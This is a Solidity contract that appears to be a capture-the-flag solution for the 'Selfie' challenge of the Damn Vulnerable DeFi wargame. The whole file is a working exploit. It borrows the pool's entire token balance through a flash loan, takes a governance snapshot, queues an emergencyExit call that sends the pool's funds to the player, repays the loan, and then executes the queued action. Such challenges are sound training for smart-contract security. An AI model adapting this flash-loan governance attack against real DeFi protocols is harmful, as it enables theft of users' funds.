// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "./ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePool_POC {
    SelfiePool public pool;
    SimpleGovernance public gov;
    DamnValuableTokenSnapshot public token;

    address public player;

    uint256 public id;

    constructor(SelfiePool _pool, SimpleGovernance _gov, DamnValuableTokenSnapshot _token) {
        player = msg.sender;
        pool = _pool;
        gov = _gov;
        token = _token;
    }

    function exploit() external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), "");
    }

    function execute() external {
        gov.executeAction(id);
    }

    function onFlashLoan(
        address ,
        address ,
        uint256 ,
        uint256 ,
        bytes calldata 
    ) external returns (bytes32){
        require(tx.origin == player);
        token.snapshot();

        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", player);
        id = gov.queueAction(address(pool), 0, payload);

        token.approve(address(pool), token.balanceOf(address(this)));

        bytes32 callback = keccak256("ERC3156FlashBorrower.onFlashLoan");
        return callback ;
    }
}